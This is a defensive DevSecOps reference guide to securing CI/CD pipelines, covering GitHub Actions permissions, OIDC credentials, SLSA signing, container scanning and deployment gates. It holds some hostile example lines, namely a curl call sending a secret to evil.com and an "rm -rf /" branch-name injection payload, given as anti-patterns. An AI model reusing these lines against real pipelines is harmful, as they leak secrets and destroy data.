# CI/CD Security

> **Category:** DevSecOps
> **Version:** 1.0.0
> **Standards:** NIST SP 800-204D, SLSA, CIS Benchmarks

---

## Table of Contents

1. [CI/CD Threat Model](#1-cicd-threat-model)
2. [Pipeline Security Fundamentals](#2-pipeline-security-fundamentals)
3. [Secret Management](#3-secret-management)
4. [Supply Chain Security (SLSA)](#4-supply-chain-security-slsa)
5. [GitHub Actions Security](#5-github-actions-security)
6. [Container Security in CI](#6-container-security-in-ci)
7. [Deployment Security](#7-deployment-security)
8. [Audit and Compliance](#8-audit-and-compliance)
9. [Reference Pipelines](#9-reference-pipelines)
10. [Checklist](#10-checklist)

---

## 1. CI/CD Threat Model

CI/CD pipelines are high-value targets: a compromised pipeline has write access to production systems.

### Attack Vectors

```
1. Compromised dependencies (SolarWinds, XZ Utils)
   → Malicious code in NPM/PyPI package → executed in CI → backdoor in artifact

2. Secrets in source code / CI logs
   → Developer commits .env → GitHub secret scanner triggers → attacker already scraped

3. Pipeline injection via user input
   → Branch name, PR title, issue label injected into shell commands
   → git checkout "$(attacker_branch)" → eval arbitrary code

4. Privileged CI runner compromise
   → Runner has AWS credentials → attacker pivots to production
   → Over-permissive IAM role → blast radius = full account

5. Dependency confusion
   → Internal package "auth-utils" → attacker publishes same name to npmjs
   → CI resolves public over private → malicious code runs in build

6. Artifact tampering
   → MITM between artifact store and deployment
   → Deploy server downloads artifact without integrity check

7. Stolen deployment credentials
   → Long-lived static credentials in CI environment
   → Credentials leaked in logs → attacker deploys to production

8. Malicious pull request
   → PR modifies CI workflow → runs on privileged runner → exfiltrates secrets
```

---

## 2. Pipeline Security Fundamentals

### Principle of Least Privilege for CI

```yaml
# GitHub Actions — scoped permissions per job
name: Deploy

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read       # Only read source code
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683

  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write      # Push to container registry
    
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write      # For OIDC (AWS, GCP) — no static credentials
      contents: read

# Anti-pattern — grants ALL permissions to all jobs:
# permissions: write-all
```

### Branch Protection Rules

```yaml
# GitHub branch protection — required for main/production branches
# Settings → Branches → Branch protection rules

Branch protection for "main":
  ✓ Require a pull request before merging
  ✓ Require approvals: 2 (for main), 1 (for staging)
  ✓ Dismiss stale pull request approvals when new commits are pushed
  ✓ Require review from Code Owners
  ✓ Require status checks to pass before merging:
      - test (unit)
      - test (integration)  
      - security-scan
      - build
  ✓ Require branches to be up to date before merging
  ✓ Require signed commits (GPG)
  ✓ Do not allow bypassing the above settings
  ✓ Restrict who can push to matching branches: [deploy-bot, release-bot]

# CODEOWNERS — define who reviews what
# .github/CODEOWNERS
/infra/         @platform-team
/security/      @security-team
*.tf            @platform-team
package.json    @principal-engineers
```

### Environment Separation

```yaml
# Environments: dev → staging → production
# Each environment has:
# - Separate secrets
# - Separate infrastructure
# - Deployment approval requirements

# GitHub Actions environments
jobs:
  deploy-staging:
    environment:
      name: staging
      url: https://staging.example.com
    # Staging: auto-deploy, no approval
    
  deploy-production:
    environment:
      name: production
      url: https://app.example.com
    # Production: requires manual approval from a specific team
    # GitHub will pause and wait for approval
```

---

## 3. Secret Management

### Never Store Secrets in Code

```bash
# What NOT to do (detected by secret scanners):
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY  # in code

# Git history is permanent — removing from HEAD is not enough
# git filter-branch or BFG Repo Cleaner to scrub history
# But remote forks may have already cached it — rotate immediately

# Detection:
git log --all -- '**/*.env'
git log -p | grep -i "secret\|password\|api_key\|token"
```

### Short-Lived Credentials via OIDC

OIDC (OpenID Connect) allows CI runners to authenticate to cloud providers without storing static credentials.

```yaml
# GitHub Actions → AWS (no AWS keys stored in GitHub)
name: Deploy

jobs:
  deploy:
    runs-on: ubuntu-latest
    permissions:
      id-token: write  # Required for OIDC token
      contents: read
    
    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
        with:
          role-to-assume: arn:aws:iam::123456789:role/github-actions-deploy
          aws-region: us-east-1
          # No access key / secret key needed — OIDC token exchanged for temporary credentials
      
      - name: Deploy
        run: aws ecs update-service --cluster prod --service api --force-new-deployment
```

```hcl
# AWS IAM Trust Policy — only allows GitHub Actions for specific repo and branch
# terraform/iam-oidc.tf
data "aws_iam_policy_document" "github_actions_trust" {
  statement {
    effect  = "Allow"
    actions = ["sts:AssumeRoleWithWebIdentity"]
    
    principals {
      type        = "Federated"
      identifiers = [aws_iam_openid_connect_provider.github.arn]
    }
    
    condition {
      test     = "StringEquals"
      variable = "token.actions.githubusercontent.com:aud"
      values   = ["sts.amazonaws.com"]
    }
    
    condition {
      test     = "StringLike"
      variable = "token.actions.githubusercontent.com:sub"
      values   = ["repo:MyOrg/my-repo:ref:refs/heads/main"]  # Only from main branch
    }
  }
}
```

### Secrets in Vault (HashiCorp Vault / AWS Secrets Manager)

```yaml
# GitHub Actions — retrieve secrets from Vault at runtime
steps:
  - name: Import Secrets
    uses: hashicorp/vault-action@d1720f055e0635fd932a1d2a48f87a666a57906  # v3.0.0
    with:
      url: https://vault.example.com
      method: jwt
      role: github-deploy
      secrets: |
        secret/data/prod/database DATABASE_URL ;
        secret/data/prod/api STRIPE_SECRET_KEY ;
        secret/data/prod/smtp SMTP_PASSWORD

  - name: Deploy
    run: deploy.sh  # DATABASE_URL, STRIPE_SECRET_KEY etc. are available as env vars
    env:
      DATABASE_URL: ${{ env.DATABASE_URL }}
```

### Secret Scanning

```yaml
# GitHub Actions — scan for secrets in code before push
- name: Secret Scanning (gitleaks)
  uses: gitleaks/gitleaks-action@v2
  with:
    args: --baseline-path=.gitleaks.toml

# .gitleaks.toml — allow specific patterns (false positive suppression)
[allowlist]
  description = "Allowed test values"
  regexes = [
    "EXAMPLE_KEY_FOR_TESTS",
    "fake-stripe-key-sk_test_",
  ]

# Also: GitHub native secret scanning (in repo settings)
# → Alerts on 200+ known secret formats (AWS, Stripe, GitHub tokens, etc.)
# → Can block pushes containing secrets (push protection)
```

---

## 4. Supply Chain Security (SLSA)

SLSA (Supply chain Levels for Software Artifacts) is a Google-originated framework for supply chain integrity.

### SLSA Levels

| Level | Description | Requirements |
|---|---|---|
| **SLSA 1** | Documentation of build process | Build process is scripted/automated |
| **SLSA 2** | Tamper resistance of build | Version control + hosted build service |
| **SLSA 3** | Extra resistance | Hardened CI, auditable build environment |
| **SLSA 4** | Highest assurance | Two-person review, hermetic builds |

### Provenance (Build Attestation)

```yaml
# Attest build provenance using sigstore/cosign
name: Build and Attest

jobs:
  build:
    permissions:
      id-token: write       # For OIDC signing
      contents: read
      packages: write
    
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      
      - name: Build Docker image
        id: build
        run: |
          docker build -t ghcr.io/myorg/myapp:${{ github.sha }} .
          docker push ghcr.io/myorg/myapp:${{ github.sha }}
          DIGEST=$(docker inspect --format='{{index .RepoDigests 0}}' ghcr.io/myorg/myapp:${{ github.sha }})
          echo "digest=$DIGEST" >> $GITHUB_OUTPUT
      
      - name: Install cosign
        uses: sigstore/cosign-installer@59acb6260d9c0ba8f4a2f9d9b48431a222b68e20  # v3.5.0
      
      - name: Sign image with keyless signing (sigstore)
        run: |
          cosign sign --yes ${{ steps.build.outputs.digest }}
          # Signature recorded in public transparency log (Rekor)
          # Anyone can verify: cosign verify ghcr.io/myorg/myapp@sha256:...
      
      - name: Generate SBOM
        uses: anchore/sbom-action@v0
        with:
          image: ghcr.io/myorg/myapp:${{ github.sha }}
          format: spdx-json
          output-file: sbom.spdx.json
      
      - name: Attest SBOM
        run: cosign attest --yes --type spdxjson --predicate sbom.spdx.json ${{ steps.build.outputs.digest }}
```

### Dependency Pinning

```yaml
# WRONG — uses mutable tag
- uses: actions/checkout@v4

# CORRECT — pin to immutable SHA
- uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2

# Why: Tags like v4 are mutable; the repo owner can change what v4 points to
# SHA is immutable — cannot be changed without creating a different SHA

# Manage with tool:
# npx pin-github-action .github/workflows/*.yml
# Automatically pins all action tags to their current SHA
```

---

## 5. GitHub Actions Security

### Hardening Workflow Permissions

```yaml
# Deny all by default, grant per job
name: CI

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

# Default: deny all permissions
permissions: {}

jobs:
  test:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # Only read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - run: npm test
  
  security-scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write  # Upload SARIF results to Security tab
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      
      - name: Run CodeQL
        uses: github/codeql-action/analyze@4fa2a7953630fd2f3fb380f21be14ede0169dd4f  # v3.25.0
```

### Preventing Command Injection via Context Variables

```yaml
# VULNERABLE — context variable interpolated directly in shell
- name: Process PR
  run: echo "PR branch: ${{ github.head_ref }}"
  # If branch name = "'; rm -rf / #" → command injection

# SECURE — pass via environment variable
- name: Process PR
  env:
    HEAD_REF: ${{ github.head_ref }}  # Shell treats this as a safe variable
  run: echo "PR branch: $HEAD_REF"   # No injection possible

# More patterns:
# VULNERABLE
- run: echo "Hello ${{ inputs.username }}"

# SECURE  
- env:
    USERNAME: ${{ inputs.username }}
  run: echo "Hello $USERNAME"
```

### Fork Pull Request Security

```yaml
# PR from fork = DANGER: fork can modify workflows
# NEVER expose secrets to forked PRs

on:
  pull_request:  # Limited permissions — no access to secrets for fork PRs
    branches: [main]

# vs

  pull_request_target:  # Runs in base repo context — CAN access secrets
    branches: [main]    # But the code runs from the HEAD of the PR (attacker's code)
    # EXTREMELY DANGEROUS — never run PR code in pull_request_target with secrets
```

### Secrets Masking and Logging

```yaml
# GitHub automatically masks secrets in logs
# But: base64 encoding, URL encoding, or concatenation bypasses masking

# DANGEROUS — masks bypass
- run: |
    echo $SECRET | base64  # Base64 encoded secret NOT masked in logs
    curl "https://evil.com?token=$SECRET&extra=value"  # concatenated

# GitHub's masker looks for exact string match
# Solution: never echo secrets, use files or environment variables only

# Add custom masks if your code computes derivative values
- run: |
    DERIVED=$(compute-from-secret "$SECRET")
    echo "::add-mask::$DERIVED"  # Tell GitHub to also mask the derived value
    echo "Derived: $DERIVED"     # Now masked in logs
```

---

## 6. Container Security in CI

### Multi-Stage Build (Minimize Attack Surface)

```dockerfile
# Builder stage — has all build tools (large image)
FROM node:20-alpine AS builder
WORKDIR /app
COPY package*.json ./
RUN npm ci --only=production

COPY . .
RUN npm run build

# Production stage — only runtime (minimal image)
FROM node:20-alpine AS production

# Security: run as non-root user
RUN addgroup -S appgroup && adduser -S appuser -G appgroup

WORKDIR /app

# Copy only production artifacts from builder
COPY --from=builder /app/dist ./dist
COPY --from=builder /app/node_modules ./node_modules

# Set file ownership
RUN chown -R appuser:appgroup /app

# Drop to non-root
USER appuser

# No shell in production (prevents shell injection)
CMD ["node", "dist/server.js"]
```

### Image Scanning in CI

```yaml
# Trivy — comprehensive vulnerability scanner
- name: Scan Docker image
  uses: aquasecurity/trivy-action@18f2505d82fe81f39b2d9ceb8b2e20c9f02db367  # v0.28.0
  with:
    image-ref: my-app:${{ github.sha }}
    format: sarif
    output: trivy-results.sarif
    severity: CRITICAL,HIGH
    exit-code: 1   # Fail build on CRITICAL/HIGH CVEs

- name: Upload scan results
  uses: github/codeql-action/upload-sarif@v3
  with:
    sarif_file: trivy-results.sarif

# Grype — alternative scanner
- name: Scan with Grype
  uses: anchore/scan-action@v3
  with:
    image: my-app:${{ github.sha }}
    fail-build: true
    severity-cutoff: high
```

### Distroless Images (Minimal Attack Surface)

```dockerfile
# Distroless: no shell, no package manager, no apt, no nothing
# Only the application and its runtime dependencies
FROM golang:1.22 AS builder
WORKDIR /app
COPY . .
RUN CGO_ENABLED=0 go build -o server .

# Distroless Go runtime
FROM gcr.io/distroless/static-debian12:nonroot
COPY --from=builder /app/server /server
ENTRYPOINT ["/server"]

# Result:
# - No shell (cannot exec into container and run commands)
# - No package manager (cannot install tools)
# - Image size: ~10MB vs ~200MB for node:alpine
# - Attack surface: minimal
```

---

## 7. Deployment Security

### Blue-Green Deployment

```
Blue = Current production (serving traffic)
Green = New version (deployed but not serving traffic)

Steps:
1. Deploy new version to Green
2. Run smoke tests on Green
3. Shift traffic: LB points to Green
4. Monitor error rate and latency
5. If OK: keep Green (becomes new Blue)
6. If bad: shift traffic back to Blue instantly (no downtime)
7. Tear down old Blue after confidence period

Benefits:
- Zero downtime deployment
- Instant rollback
- Can canary test with % traffic split (10% → 50% → 100%)
```

### Deployment Gates (Automated Safety Checks)

```yaml
# Deployment pipeline with automated rollback
name: Deploy Production

jobs:
  deploy:
    steps:
      - name: Deploy to ECS
        id: deploy
        run: |
          aws ecs update-service --cluster prod --service api --force-new-deployment
          # Wait for deployment to stabilize
          aws ecs wait services-stable --cluster prod --services api
      
      - name: Health Check
        id: health
        run: |
          for i in {1..10}; do
            STATUS=$(curl -s -o /dev/null -w "%{http_code}" https://api.example.com/health)
            if [ "$STATUS" = "200" ]; then exit 0; fi
            sleep 10
          done
          exit 1  # Health check failed
      
      - name: Smoke Tests
        run: npm run test:smoke
      
      - name: Rollback on failure
        if: failure()
        run: |
          # Get previous task definition and roll back
          PREV_TASK=$(aws ecs describe-services --cluster prod --services api --query 'services[0].deployments[-1].taskDefinition' --output text)
          aws ecs update-service --cluster prod --service api --task-definition $PREV_TASK
```

### GitOps (Declarative Deployment)

```yaml
# ArgoCD / Flux — desired state in Git, applied to cluster
# Git is the single source of truth for what's deployed

# apps/prod/deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: api
  namespace: production
spec:
  replicas: 3
  selector:
    matchLabels:
      app: api
  template:
    spec:
      containers:
      - name: api
        image: ghcr.io/myorg/api:abc123sha  # Pinned to specific SHA
        
# ArgoCD detects diff between Git (desired) and cluster (actual)
# Auto-syncs to match Git state
# Any unauthorized change to cluster is overwritten next sync cycle

# Benefits:
# - All changes go through PR → review → approval → merge
# - Rollback = git revert + merge
# - Audit trail in git history
# - No direct kubectl access needed (less blast radius)
```

---

## 8. Audit and Compliance

### Immutable Audit Log for CI/CD

```yaml
# Every pipeline run generates audit trail:
# - Who triggered it
# - What commit/branch
# - What changed (diff)
# - What tests ran and passed
# - Who approved deployment
# - When deployed
# - What version is running

# Export CI/CD logs to immutable storage
- name: Export audit log
  run: |
    jq -n \
      --arg event "${{ github.event_name }}" \
      --arg actor "${{ github.actor }}" \
      --arg sha "${{ github.sha }}" \
      --arg ref "${{ github.ref }}" \
      --arg ts "$(date -u +%Y-%m-%dT%H:%M:%SZ)" \
      '{
        event: $event,
        actor: $actor,
        sha: $sha,
        ref: $ref,
        timestamp: $ts,
        workflow_run_id: ${{ github.run_id }}
      }' | \
      aws s3 cp - s3://audit-logs/cicd/$(date +%Y/%m/%d)/${{ github.run_id }}.json
```

### Compliance Controls

| Control | Requirement | Implementation |
|---|---|---|
| Change management | SOC2, ISO27001 | PR + approval workflow |
| Separation of duties | PCI-DSS, SOX | Dev cannot deploy without review |
| Access logging | GDPR, HIPAA | CloudTrail, GitHub audit log |
| Vulnerability remediation SLA | PCI-DSS | Critical: 24h, High: 7 days, Medium: 30 days |
| Code review | ISO27001 | CODEOWNERS, required reviews |
| Secret management | All | Vault, no hardcoded secrets |
| Artifact signing | SLSA | cosign + sigstore |

---

## 9. Reference Pipelines

### Complete Secure Node.js Pipeline

```yaml
name: CI/CD Pipeline

on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

permissions: {}  # Default: no permissions

env:
  NODE_VERSION: '20'
  IMAGE_NAME: ghcr.io/${{ github.repository }}

jobs:
  # ─── Phase 1: Checks (fast feedback) ─────────────────────────────────────
  lint-and-type-check:
    name: Lint & Type Check
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af  # v4.1.0
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: npm
      - run: npm ci
      - run: npm run lint
      - run: npm run type-check

  secret-scan:
    name: Secret Scan
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
        with:
          fetch-depth: 0  # Full history for gitleaks
      - uses: gitleaks/gitleaks-action@v2

  # ─── Phase 2: Tests ───────────────────────────────────────────────────────
  test:
    name: Test
    runs-on: ubuntu-latest
    permissions:
      contents: read
    services:
      postgres:
        image: postgres:16-alpine
        env:
          POSTGRES_DB: testdb
          POSTGRES_USER: test
          POSTGRES_PASSWORD: test
        ports: [5432:5432]
        options: --health-cmd pg_isready --health-interval 10s --health-timeout 5s --health-retries 5
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: npm
      - run: npm ci
      - run: npm test
        env:
          DATABASE_URL: postgresql://test:test@localhost:5432/testdb

  # ─── Phase 3: Security Scan ───────────────────────────────────────────────
  sast:
    name: SAST (CodeQL)
    runs-on: ubuntu-latest
    permissions:
      contents: read
      security-events: write
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: github/codeql-action/init@4fa2a7953630fd2f3fb380f21be14ede0169dd4f
        with:
          languages: javascript
      - uses: github/codeql-action/autobuild@4fa2a7953630fd2f3fb380f21be14ede0169dd4f
      - uses: github/codeql-action/analyze@4fa2a7953630fd2f3fb380f21be14ede0169dd4f

  dependency-scan:
    name: Dependency Scan
    runs-on: ubuntu-latest
    permissions:
      contents: read
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      - uses: actions/setup-node@39370e3970a6d050c480ffad4ff0ed4d3fdee5af
        with:
          node-version: ${{ env.NODE_VERSION }}
          cache: npm
      - run: npm audit --audit-level=high

  # ─── Phase 4: Build ───────────────────────────────────────────────────────
  build:
    name: Build & Push Image
    needs: [lint-and-type-check, test, sast, dependency-scan, secret-scan]
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
      id-token: write
    outputs:
      image-digest: ${{ steps.build.outputs.digest }}
    steps:
      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683
      
      - name: Login to GHCR
        uses: docker/login-action@9780b0c442fbb1117ed29e0efdff1e18412f7567  # v3.3.0
        with:
          registry: ghcr.io
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}
      
      - name: Build and push
        id: build
        uses: docker/build-push-action@5cd11c3a4ced054e52742c5fd54dca954e0edd85  # v6.7.0
        with:
          push: true
          tags: ${{ env.IMAGE_NAME }}:${{ github.sha }}
          labels: |
            org.opencontainers.image.revision=${{ github.sha }}
      
      - name: Scan image
        uses: aquasecurity/trivy-action@18f2505d82fe81f39b2d9ceb8b2e20c9f02db367
        with:
          image-ref: ${{ env.IMAGE_NAME }}@${{ steps.build.outputs.digest }}
          severity: CRITICAL,HIGH
          exit-code: 1
      
      - name: Sign image
        run: cosign sign --yes ${{ env.IMAGE_NAME }}@${{ steps.build.outputs.digest }}

  # ─── Phase 5: Deploy ──────────────────────────────────────────────────────
  deploy-staging:
    name: Deploy to Staging
    needs: [build]
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        with:
          role-to-assume: arn:aws:iam::${{ secrets.AWS_ACCOUNT_ID }}:role/github-deploy-staging
          aws-region: us-east-1
      
      - name: Deploy to ECS staging
        run: |
          aws ecs update-service \
            --cluster staging \
            --service api \
            --force-new-deployment \
            --no-cli-pager
          aws ecs wait services-stable --cluster staging --services api
      
      - name: Run smoke tests
        run: |
          curl -f https://staging.example.com/health || exit 1

  deploy-production:
    name: Deploy to Production
    needs: [deploy-staging]
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://app.example.com
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Configure AWS credentials
        uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502
        with:
          role-to-assume: arn:aws:iam::${{ secrets.AWS_ACCOUNT_ID }}:role/github-deploy-prod
          aws-region: us-east-1
      
      - name: Deploy to ECS production
        run: |
          aws ecs update-service \
            --cluster production \
            --service api \
            --force-new-deployment \
            --no-cli-pager
          aws ecs wait services-stable --cluster production --services api
```

---

## 10. Checklist

**Pipeline Security**
- [ ] All GitHub Action steps pinned to SHA (not mutable tag)
- [ ] `permissions: {}` default at workflow level; explicit grants per job
- [ ] Branch protection: PR required, reviews required, status checks required
- [ ] No force-push or direct push to main
- [ ] Signed commits required (GPG)

**Secrets**
- [ ] No secrets in code or config files committed to git
- [ ] OIDC used instead of static credentials (AWS, GCP)
- [ ] Secrets in Vault or cloud secrets manager (not GitHub Secrets for long-term)
- [ ] Secret scanning enabled (GitHub + gitleaks in pipeline)
- [ ] Context variables never interpolated directly in shell commands

**Supply Chain**
- [ ] Dependencies pinned in lockfile (package-lock.json, poetry.lock)
- [ ] `npm audit --audit-level=high` in CI (fail on high/critical)
- [ ] Container images scanned for vulnerabilities (Trivy/Grype)
- [ ] Container images signed (cosign)
- [ ] SBOM generated for each release

**Deployment**
- [ ] Staging deployed and tested before production
- [ ] Production deployment requires manual approval
- [ ] Rollback procedure documented and tested
- [ ] Health checks verified post-deployment
- [ ] GitOps pattern: Git is source of truth for deployment state

**Compliance**
- [ ] All deployments logged with actor, SHA, timestamp
- [ ] Audit logs written to immutable storage
- [ ] CODEOWNERS defined for sensitive paths
- [ ] Separation of duties: devs cannot self-approve and deploy
